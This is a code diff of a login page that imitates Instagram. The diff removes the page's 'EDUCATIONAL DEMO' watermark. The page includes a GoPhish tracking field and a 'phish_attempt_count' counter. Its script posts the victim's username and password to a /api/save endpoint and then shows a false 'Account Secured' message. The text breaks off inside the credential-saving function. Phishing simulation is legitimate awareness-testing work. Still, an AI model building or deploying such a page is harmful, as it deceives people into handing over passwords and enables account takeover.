@@ -1,874 +1,935 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram login • authentic</title>
-  <!-- Font Awesome (free icons) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    /* ----- global reset & base ----- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram login • authentic</title>
+    <!-- Font Awesome (free icons) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* ----- global reset & base ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-    body {
-      background: #fafafa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
 
-    /* main card – authentic instagram feel */
-    .login-container {
-      max-width: 350px;
-      width: 100%;
-      background: #fff;
-      border: 1px solid #dbdbdb;
-      border-radius: 1px;
-      padding: 40px 30px 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-      transition: all 0.2s;
-    }
+        /* main card – authentic instagram feel */
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px 30px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+            transition: all 0.2s;
+        }
 
-    /* ----- logo (instagram wordmark) ----- */
-    .logo {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-    .logo i {
-      font-size: 22px;
-      color: #262626;
-      margin-right: 4px;
-    }
-    .logo span {
-      font-family: 'Billabong', cursive, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      font-size: 40px;
-      font-weight: 600;
-      letter-spacing: -0.5px;
-      color: #262626;
-      background: transparent;
-    }
-    /* fallback for billabong – use a generic cursive */
-    @font-face {
-      font-family: 'Billabong';
-      src: local('Billabong'), local('Segoe UI'), local('Roboto');
-      font-weight: normal;
-      font-style: normal;
-    }
-    .logo span {
-      font-family: 'Billabong', cursive, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    }
+        /* ----- logo (instagram wordmark) ----- */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-    /* ----- form fields ----- */
-    .login-form {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
+        .logo i {
+            font-size: 22px;
+            color: #262626;
+            margin-right: 4px;
+        }
 
-    .login-form input[type="text"],
-    .login-form input[type="password"],
-    .login-form input[type="email"] {
-      width: 100%;
-      padding: 12px 10px;
-      background: #fafafa;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
-      font-size: 12px;
-      color: #262626;
-      outline: none;
-      transition: border 0.1s ease;
-    }
-    .login-form input:focus {
-      border-color: #a8a8a8;
-      background: #fff;
-    }
-    .login-form input::placeholder {
-      color: #8e8e8e;
-      font-size: 12px;
-      font-weight: 300;
-    }
+        .logo span {
+            font-family: 'Billabong', cursive, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 40px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            color: #262626;
+            background: transparent;
+        }
 
-    /* Error state for inputs */
-    .login-form input.error {
-      border-color: #ed4956;
-      background: #fde7e9;
-    }
+        /* fallback for billabong – use a generic cursive */
+        @font-face {
+            font-family: 'Billabong';
+            src: local('Billabong'), local('Segoe UI'), local('Roboto');
+            font-weight: normal;
+            font-style: normal;
+        }
 
-    .login-form input.error:focus {
-      border-color: #ed4956;
-      background: #fde7e9;
-    }
+        .logo span {
+            font-family: 'Billabong', cursive, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
 
-    /* Error message */
-    .error-message {
-      color: #ed4956;
-      font-size: 12px;
-      font-weight: 500;
-      margin-top: 4px;
-      display: none;
-      align-items: center;
-      gap: 4px;
-    }
-    .error-message.show {
-      display: flex;
-    }
-    .error-message i {
-      font-size: 14px;
-    }
+        /* ----- form fields ----- */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
 
-    /* login button */
-    .login-btn {
-      margin-top: 12px;
-      background: #0095f6;
-      border: none;
-      border-radius: 4px;
-      padding: 8px 0;
-      font-weight: 600;
-      font-size: 14px;
-      color: #fff;
-      cursor: pointer;
-      transition: background 0.15s;
-      letter-spacing: 0.3px;
-      opacity: 0.9;
-      position: relative;
-    }
-    .login-btn:hover {
-      background: #1877f2;
-      opacity: 1;
-    }
-    .login-btn:active {
-      transform: scale(0.98);
-    }
-    .login-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
+        .login-form input[type="text"],
+        .login-form input[type="password"],
+        .login-form input[type="email"] {
+            width: 100%;
+            padding: 12px 10px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            transition: border 0.1s ease;
+        }
 
-    /* divider "OR" */
-    .divider {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 18px 0 16px;
-      gap: 18px;
-    }
-    .divider-line {
-      flex: 1;
-      height: 1px;
-      background: #dbdbdb;
-    }
-    .divider-text {
-      font-size: 12px;
-      font-weight: 600;
-      color: #8e8e8e;
-      letter-spacing: 0.3px;
-      text-transform: uppercase;
-    }
+        .login-form input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+        }
 
-    /* facebook login (mock) */
-    .fb-login {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 6px;
-      margin: 6px 0 16px;
-      cursor: default;
-    }
-    .fb-login i {
-      color: #385185;
-      font-size: 18px;
-    }
-    .fb-login span {
-      color: #385185;
-      font-weight: 600;
-      font-size: 14px;
-    }
+        .login-form input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 300;
+        }
 
-    /* forgot password */
-    .forgot-pw {
-      text-align: center;
-      margin-top: 8px;
-    }
-    .forgot-pw a {
-      color: #00376b;
-      font-size: 12px;
-      text-decoration: none;
-    }
-    .forgot-pw a:hover {
-      text-decoration: underline;
-    }
+        /* Error state for inputs */
+        .login-form input.error {
+            border-color: #ed4956;
+            background: #fde7e9;
+        }
 
-    /* ----- signup callout (inside container) ----- */
-    .signup-callout {
-      margin-top: 20px;
-      border-top: 1px solid #dbdbdb;
-      padding-top: 20px;
-      text-align: center;
-      font-size: 14px;
-      color: #262626;
-    }
-    .signup-callout a {
-      color: #0095f6;
-      font-weight: 600;
-      text-decoration: none;
-    }
-    .signup-callout a:hover {
-      text-decoration: underline;
-    }
+        .login-form input.error:focus {
+            border-color: #ed4956;
+            background: #fde7e9;
+        }
 
-    /* ----- meta / footer (app store badges) ----- */
-    .meta-footer {
-      margin-top: 24px;
-      text-align: center;
-    }
-    .meta-footer p {
-      font-size: 13px;
-      color: #8e8e8e;
-      margin-bottom: 12px;
-    }
-    .app-badges {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-    .app-badges img {
-      height: 40px;
-      width: auto;
-      display: block;
-      filter: brightness(0.98);
-    }
-    /* fallback if images don't load – we use simple text badges */
-    .badge-fallback {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-    }
-    .badge-fallback span {
-      background: #efefef;
-      padding: 6px 14px;
-      border-radius: 6px;
-      font-size: 11px;
-      font-weight: 500;
-      color: #262626;
-      letter-spacing: 0.3px;
-      border: 1px solid #dbdbdb;
-    }
+        /* Error message */
+        .error-message {
+            color: #ed4956;
+            font-size: 12px;
+            font-weight: 500;
+            margin-top: 4px;
+            display: none;
+            align-items: center;
+            gap: 4px;
+        }
 
-    /* ----- security notice (red asterisk) ----- */
-    .security-notice {
-      margin-top: 20px;
-      text-align: center;
-      font-size: 12px;
-      color: #ed4956;
-      border-top: 1px solid #efefef;
-      padding-top: 16px;
-      line-height: 1.5;
-      font-weight: 500;
-    }
-    .security-notice i {
-      margin-right: 4px;
-    }
+        .error-message.show {
+            display: flex;
+        }
 
-    /* responsiveness */
-    @media (max-width: 450px) {
-      .login-container {
-        padding: 30px 18px 20px;
-        border: none;
-        background: transparent;
-        box-shadow: none;
-      }
-      body {
-        background: #fff;
-        padding: 10px;
-      }
-      .meta-footer {
-        margin-top: 16px;
-      }
-    }
+        .error-message i {
+            font-size: 14px;
+        }
 
-    /* Popup overlay – shown ONLY after clicking submit */
-    .popup-overlay {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: none; /* hidden by default */
-      align-items: center;
-      justify-content: center;
-      z-index: 999;
-      backdrop-filter: blur(2px);
-    }
-    .popup-box {
-      background: #fff;
-      padding: 30px 35px;
-      max-width: 340px;
-      width: 90%;
-      border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      animation: fadeIn 0.3s ease;
-    }
-    .popup-box i {
-      font-size: 44px;
-      color: #0095f6;
-      margin-bottom: 12px;
-    }
-    .popup-box h3 {
-      font-size: 20px;
-      color: #262626;
-      margin-bottom: 8px;
-    }
-    .popup-box p {
-      font-size: 14px;
-      color: #4a4a4a;
-      line-height: 1.5;
-      margin-bottom: 18px;
-    }
-    .popup-box button {
-      background: #0095f6;
-      border: none;
-      padding: 8px 28px;
-      border-radius: 6px;
-      color: #fff;
-      font-weight: 600;
-      font-size: 14px;
-      cursor: pointer;
-      transition: background 0.15s;
-    }
-    .popup-box button:hover {
-      background: #1877f2;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
+        /* login button */
+        .login-btn {
+            margin-top: 12px;
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 0;
+            font-weight: 600;
+            font-size: 14px;
+            color: #fff;
+            cursor: pointer;
+            transition: background 0.15s;
+            letter-spacing: 0.3px;
+            opacity: 0.9;
+            position: relative;
+        }
 
-    /* loading spinner */
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-top: 2px solid #fff;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin-right: 8px;
-      vertical-align: middle;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .login-btn .spinner {
-      display: none;
-    }
-    .login-btn.loading .spinner {
-      display: inline-block;
-    }
-    .login-btn.loading .btn-text {
-      display: inline-block;
-    }
+        .login-btn:hover {
+            background: #1877f2;
+            opacity: 1;
+        }
 
-    /* Educational watermark */
-    .edu-badge {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      background: rgba(0,0,0,0.7);
-      color: #fff;
-      padding: 6px 12px;
-      border-radius: 4px;
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: 0.5px;
-      z-index: 9999;
-      pointer-events: none;
-    }
+        .login-btn:active {
+            transform: scale(0.98);
+        }
 
-    /* Shake animation for error */
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-      20%, 40%, 60%, 80% { transform: translateX(5px); }
-    }
-    .shake {
-      animation: shake 0.5s ease-in-out;
-    }
-  </style>
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* divider "OR" */
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 18px 0 16px;
+            gap: 18px;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider-text {
+            font-size: 12px;
+            font-weight: 600;
+            color: #8e8e8e;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        /* facebook login (mock) */
+        .fb-login {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            margin: 6px 0 16px;
+            cursor: default;
+        }
+
+        .fb-login i {
+            color: #385185;
+            font-size: 18px;
+        }
+
+        .fb-login span {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        /* forgot password */
+        .forgot-pw {
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        .forgot-pw a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-pw a:hover {
+            text-decoration: underline;
+        }
+
+        /* ----- signup callout (inside container) ----- */
+        .signup-callout {
+            margin-top: 20px;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-callout a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-callout a:hover {
+            text-decoration: underline;
+        }
+
+        /* ----- meta / footer (app store badges) ----- */
+        .meta-footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .meta-footer p {
+            font-size: 13px;
+            color: #8e8e8e;
+            margin-bottom: 12px;
+        }
+
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .app-badges img {
+            height: 40px;
+            width: auto;
+            display: block;
+            filter: brightness(0.98);
+        }
+
+        /* fallback if images don't load – we use simple text badges */
+        .badge-fallback {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .badge-fallback span {
+            background: #efefef;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 500;
+            color: #262626;
+            letter-spacing: 0.3px;
+            border: 1px solid #dbdbdb;
+        }
+
+        /* ----- security notice (red asterisk) ----- */
+        .security-notice {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #ed4956;
+            border-top: 1px solid #efefef;
+            padding-top: 16px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+
+        .security-notice i {
+            margin-right: 4px;
+        }
+
+        /* responsiveness */
+        @media (max-width: 450px) {
+            .login-container {
+                padding: 30px 18px 20px;
+                border: none;
+                background: transparent;
+                box-shadow: none;
+            }
+
+            body {
+                background: #fff;
+                padding: 10px;
+            }
+
+            .meta-footer {
+                margin-top: 16px;
+            }
+        }
+
+        /* Popup overlay – shown ONLY after clicking submit */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            /* hidden by default */
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            backdrop-filter: blur(2px);
+        }
+
+        .popup-box {
+            background: #fff;
+            padding: 30px 35px;
+            max-width: 340px;
+            width: 90%;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .popup-box i {
+            font-size: 44px;
+            color: #0095f6;
+            margin-bottom: 12px;
+        }
+
+        .popup-box h3 {
+            font-size: 20px;
+            color: #262626;
+            margin-bottom: 8px;
+        }
+
+        .popup-box p {
+            font-size: 14px;
+            color: #4a4a4a;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+
+        .popup-box button {
+            background: #0095f6;
+            border: none;
+            padding: 8px 28px;
+            border-radius: 6px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .popup-box button:hover {
+            background: #1877f2;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        /* loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .login-btn .spinner {
+            display: none;
+        }
+
+        .login-btn.loading .spinner {
+            display: inline-block;
+        }
+
+        .login-btn.loading .btn-text {
+            display: inline-block;
+        }
+
+        /* Shake animation for error */
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(-5px);
+            }
+
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(5px);
+            }
+        }
+
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+    </style>
 </head>
+
 <body>
-  <!-- Educational watermark -->
-  <div class="edu-badge">🔐 EDUCATIONAL DEMO</div>
 
-  <div class="login-container">
+    <div class="login-container">
 
-    <!-- Instagram logo -->
-    <div class="logo">
-      <i class="fab fa-instagram"></i>
-      <span>Instagram</span>
+        <!-- Instagram logo -->
+        <div class="logo">
+            <i class="fab fa-instagram"></i>
+            <span>Instagram</span>
+        </div>
+
+        <!-- login form: captures credentials, shows popup, redirects to instagram.com -->
+        <form class="login-form" id="loginForm" method="POST" action="#">
+            <input type="text" name="username" id="username" placeholder="Phone number, username, or email"
+                autocomplete="username" required>
+            <div class="error-message" id="usernameError">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="usernameErrorText">Please enter a valid username, email, or phone number</span>
+            </div>
+
+            <input type="password" name="password" id="password" placeholder="Password" autocomplete="current-password"
+                required>
+            <div class="error-message" id="passwordError">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="passwordErrorText">Password must be at least 6 characters</span>
+            </div>
+
+            <!-- hidden rid (compatible with GoPhish) -->
+            <input type="hidden" name="rid" value="demo_rid_123">
+
+            <!-- General error message (for incorrect credentials) -->
+            <div class="error-message" id="generalError"
+                style="margin-top: 8px; justify-content: center; font-size: 14px;">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="generalErrorText">Sorry, your password was incorrect. Please double-check your
+                    password.</span>
+            </div>
+
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span class="spinner"></span>
+                <span class="btn-text">Log in</span>
+            </button>
+        </form>
+
+        <!-- OR divider -->
+        <div class="divider">
+            <span class="divider-line"></span>
+            <span class="divider-text">OR</span>
+            <span class="divider-line"></span>
+        </div>
+
+        <!-- facebook login (mock) -->
+        <div class="fb-login" id="fbLogin">
+            <i class="fab fa-facebook-square"></i>
+            <span>Log in with Facebook</span>
+        </div>
+
+        <!-- forgot password -->
+        <div class="forgot-pw">
+            <a href="#" id="forgotLink">Forgot password?</a>
+        </div>
+
+        <!-- signup callout -->
+        <div class="signup-callout">
+            Don't have an account? <a href="#" id="signupLink">Sign up</a>
+        </div>
+
+        <!-- meta footer: get the app -->
+        <div class="meta-footer">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <i class="fab fa-google-play" style="font-size:32px; color:#3c3c3c; opacity:0.7;"></i>
+                <i class="fab fa-apple" style="font-size:34px; color:#3c3c3c; opacity:0.7;"></i>
+                <span style="display:none;">&nbsp;</span>
+            </div>
+            <div class="badge-fallback" style="margin-top:6px;">
+                <span>Google Play</span>
+                <span>App Store</span>
+            </div>
+        </div>
+
+        <!-- security notice -->
+        <div class="security-notice">
+            <i class="fas fa-asterisk" style="font-size:10px;"></i>
+            Please provide accurate details to secure your account.
+        </div>
     </div>
 
-    <!-- login form: captures credentials, shows popup, redirects to instagram.com -->
-    <form class="login-form" id="loginForm" method="POST" action="#">
-      <input type="text" name="username" id="username" placeholder="Phone number, username, or email" autocomplete="username" required>
-      <div class="error-message" id="usernameError">
-        <i class="fas fa-exclamation-circle"></i>
-        <span id="usernameErrorText">Please enter a valid username, email, or phone number</span>
-      </div>
-      
-      <input type="password" name="password" id="password" placeholder="Password" autocomplete="current-password" required>
-      <div class="error-message" id="passwordError">
-        <i class="fas fa-exclamation-circle"></i>
-        <span id="passwordErrorText">Password must be at least 6 characters</span>
-      </div>
-      
-      <!-- hidden rid (compatible with GoPhish) -->
-      <input type="hidden" name="rid" value="demo_rid_123">
-      
-      <!-- General error message (for incorrect credentials) -->
-      <div class="error-message" id="generalError" style="margin-top: 8px; justify-content: center; font-size: 14px;">
-        <i class="fas fa-exclamation-circle"></i>
-        <span id="generalErrorText">Sorry, your password was incorrect. Please double-check your password.</span>
-      </div>
-      
-      <button type="submit" class="login-btn" id="loginBtn">
-        <span class="spinner"></span>
-        <span class="btn-text">Log in</span>
-      </button>
-    </form>
-
-    <!-- OR divider -->
-    <div class="divider">
-      <span class="divider-line"></span>
-      <span class="divider-text">OR</span>
-      <span class="divider-line"></span>
+    <!-- Popup overlay: "Your account is secured" (shown ONLY after submit) -->
+    <div class="popup-overlay" id="successPopup">
+        <div class="popup-box">
+            <i class="fas fa-shield-alt"></i>
+            <h3>Account Secured</h3>
+            <p>Your account is now secured with advanced protection. Stay safe!</p>
+            <button id="popupCloseBtn">OK, got it</button>
+        </div>
     </div>
 
-    <!-- facebook login (mock) -->
-    <div class="fb-login" id="fbLogin">
-      <i class="fab fa-facebook-square"></i>
-      <span>Log in with Facebook</span>
-    </div>
+    <script>
+        (function () {
+            // DOM elements
+            const form = document.getElementById('loginForm');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const popup = document.getElementById('successPopup');
+            const popupClose = document.getElementById('popupCloseBtn');
+            const loginBtn = document.getElementById('loginBtn');
+            const generalError = document.getElementById('generalError');
+            const generalErrorText = document.getElementById('generalErrorText');
+            const usernameError = document.getElementById('usernameError');
+            const usernameErrorText = document.getElementById('usernameErrorText');
+            const passwordError = document.getElementById('passwordError');
+            const passwordErrorText = document.getElementById('passwordErrorText');
 
-    <!-- forgot password -->
-    <div class="forgot-pw">
-      <a href="#" id="forgotLink">Forgot password?</a>
-    </div>
+            // ===== PERSISTENT ATTEMPT COUNT USING localStorage =====
+            function getAttemptCount() {
+                return parseInt(localStorage.getItem('phish_attempt_count') || '0');
+            }
 
-    <!-- signup callout -->
-    <div class="signup-callout">
-      Don't have an account? <a href="#" id="signupLink">Sign up</a>
-    </div>
+            function incrementAttemptCount() {
+                const current = getAttemptCount();
+                const newCount = current + 1;
+                localStorage.setItem('phish_attempt_count', newCount.toString());
+                return newCount;
+            }
 
-    <!-- meta footer: get the app -->
-    <div class="meta-footer">
-      <p>Get the app.</p>
-      <div class="app-badges">
-        <i class="fab fa-google-play" style="font-size:32px; color:#3c3c3c; opacity:0.7;"></i>
-        <i class="fab fa-apple" style="font-size:34px; color:#3c3c3c; opacity:0.7;"></i>
-        <span style="display:none;">&nbsp;</span>
-      </div>
-      <div class="badge-fallback" style="margin-top:6px;">
-        <span>Google Play</span>
-        <span>App Store</span>
-      </div>
-    </div>
+            function resetAttemptCount() {
+                localStorage.removeItem('phish_attempt_count');
+                console.log('🔄 Attempt counter reset');
+            }
 
-    <!-- security notice -->
-    <div class="security-notice">
-      <i class="fas fa-asterisk" style="font-size:10px;"></i> 
-      Please provide accurate details to secure your account.
-    </div>
-  </div>
+            // Get current attempt count
+            let attemptCount = getAttemptCount();
+            console.log(`📊 Current attempt count: ${attemptCount}`);
 
-  <!-- Popup overlay: "Your account is secured" (shown ONLY after submit) -->
-  <div class="popup-overlay" id="successPopup">
-    <div class="popup-box">
-      <i class="fas fa-shield-alt"></i>
-      <h3>Account Secured</h3>
-      <p>Your account is now secured with advanced protection. Stay safe!</p>
-      <button id="popupCloseBtn">OK, got it</button>
-    </div>
-  </div>
+            // ----- VALIDATION FUNCTIONS -----
 
-  <script>
-    (function() {
-      // DOM elements
-      const form = document.getElementById('loginForm');
-      const usernameInput = document.getElementById('username');
-      const passwordInput = document.getElementById('password');
-      const popup = document.getElementById('successPopup');
-      const popupClose = document.getElementById('popupCloseBtn');
-      const loginBtn = document.getElementById('loginBtn');
-      const generalError = document.getElementById('generalError');
-      const generalErrorText = document.getElementById('generalErrorText');
-      const usernameError = document.getElementById('usernameError');
-      const usernameErrorText = document.getElementById('usernameErrorText');
-      const passwordError = document.getElementById('passwordError');
-      const passwordErrorText = document.getElementById('passwordErrorText');
+            // Email validation
+            function isValidEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
 
-      // ===== PERSISTENT ATTEMPT COUNT USING localStorage =====
-      function getAttemptCount() {
-        return parseInt(localStorage.getItem('phish_attempt_count') || '0');
-      }
+            // Username validation (Instagram-style)
+            function isValidUsername(username) {
+                const re = /^[a-zA-Z0-9._]{1,30}$/;
+                return re.test(username);
+            }
 
-      function incrementAttemptCount() {
-        const current = getAttemptCount();
-        const newCount = current + 1;
-        localStorage.setItem('phish_attempt_count', newCount.toString());
-        return newCount;
-      }
+            // Phone validation
+            function isValidPhone(phone) {
+                const digits = phone.replace(/\D/g, '');
+                return digits.length >= 10 && digits.length <= 15;
+            }
 
-      function resetAttemptCount() {
-        localStorage.removeItem('phish_attempt_count');
-        console.log('🔄 Attempt counter reset');
-      }
+            // Comprehensive username/email/phone validation with specific error messages
+            function validateUsername(username) {
+                const trimmed = username.trim();
 
-      // Get current attempt count
-      let attemptCount = getAttemptCount();
-      console.log(`📊 Current attempt count: ${attemptCount}`);
+                if (!trimmed || trimmed === '') {
+                    return {
+                        valid: false,
+                        message: 'Please enter your username, email, or phone number'
+                    };
+                }
 
-      // ----- VALIDATION FUNCTIONS -----
-      
-      // Email validation
-      function isValidEmail(email) {
-        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return re.test(email);
-      }
+                if (isValidEmail(trimmed)) {
+                    return { valid: true, type: 'email' };
+                }
 
-      // Username validation (Instagram-style)
-      function isValidUsername(username) {
-        const re = /^[a-zA-Z0-9._]{1,30}$/;
-        return re.test(username);
-      }
+                if (isValidPhone(trimmed)) {
+                    return { valid: true, type: 'phone' };
+                }
 
-      // Phone validation
-      function isValidPhone(phone) {
-        const digits = phone.replace(/\D/g, '');
-        return digits.length >= 10 && digits.length <= 15;
-      }
+                if (isValidUsername(trimmed)) {
+                    return { valid: true, type: 'username' };
+                }
 
-      // Comprehensive username/email/phone validation with specific error messages
-      function validateUsername(username) {
-        const trimmed = username.trim();
-        
-        if (!trimmed || trimmed === '') {
-          return { 
-            valid: false, 
-            message: 'Please enter your username, email, or phone number' 
-          };
-        }
-        
-        if (isValidEmail(trimmed)) {
-          return { valid: true, type: 'email' };
-        }
-        
-        if (isValidPhone(trimmed)) {
-          return { valid: true, type: 'phone' };
-        }
-        
-        if (isValidUsername(trimmed)) {
-          return { valid: true, type: 'username' };
-        }
-        
-        if (trimmed.includes('@')) {
-          if (!trimmed.includes('.')) {
-            return { 
-              valid: false, 
-              message: 'Please enter a valid email address (e.g., user@domain.com)' 
-            };
-          }
-          return { 
-            valid: false, 
-            message: 'Please enter a valid email address' 
-          };
-        }
-        
-        if (/\d/.test(trimmed)) {
-          const digits = trimmed.replace(/\D/g, '');
-          if (digits.length < 10) {
-            return { 
-              valid: false, 
-              message: 'Phone number must have at least 10 digits' 
-            };
-          }
-        }
-        
-        return { 
-          valid: false, 
-          message: 'Please enter a valid username, email, or phone number' 
-        };
-      }
+                if (trimmed.includes('@')) {
+                    if (!trimmed.includes('.')) {
+                        return {
+                            valid: false,
+                            message: 'Please enter a valid email address (e.g., user@domain.com)'
+                        };
+                    }
+                    return {
+                        valid: false,
+                        message: 'Please enter a valid email address'
+                    };
+                }
 
-      // Password validation
-      function validatePassword(password) {
-        const trimmed = password.trim();
-        
-        if (!trimmed || trimmed === '') {
-          return { 
-            valid: false, 
-            message: 'Please enter your password' 
-          };
-        }
-        
-        if (trimmed.length < 6) {
-          return { 
-            valid: false, 
-            message: 'Password must be at least 6 characters' 
-          };
-        }
-        
-        return { valid: true };
-      }
+                if (/\d/.test(trimmed)) {
+                    const digits = trimmed.replace(/\D/g, '');
+                    if (digits.length < 10) {
+                        return {
+                            valid: false,
+                            message: 'Phone number must have at least 10 digits'
+                        };
+                    }
+                }
 
-      // Hide all error messages
-      function hideAllErrors() {
-        generalError.classList.remove('show');
-        usernameError.classList.remove('show');
-        passwordError.classList.remove('show');
-        usernameInput.classList.remove('error');
-        passwordInput.classList.remove('error');
-        loginBtn.classList.remove('shake');
-      }
+                return {
+                    valid: false,
+                    message: 'Please enter a valid username, email, or phone number'
+                };
+            }
 
-      // Show specific error
-      function showError(errorElement, inputElement = null) {
-        errorElement.classList.add('show');
-        if (inputElement) {
-          inputElement.classList.add('error');
-          inputElement.focus();
-        }
-        loginBtn.classList.add('shake');
-        setTimeout(() => {
-          loginBtn.classList.remove('shake');
-        }, 500);
-      }
+            // Password validation
+            function validatePassword(password) {
+                const trimmed = password.trim();
 
-      // ----- Save credentials to server -----
-      async function saveToServer(username, password) {
-        try {
-          const response = await fetch('/api/save', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-              username: username,
-              password: password,
-              rid: 'demo_rid_123',
-              attempt: attemptCount
-            })
-          });
-          
-          const data = await response.json();
-          if (data.success) {
-            console.log('✅ Data saved to server:', data);
-          } else {
-            console.warn('⚠️ Server save failed:', data.error);
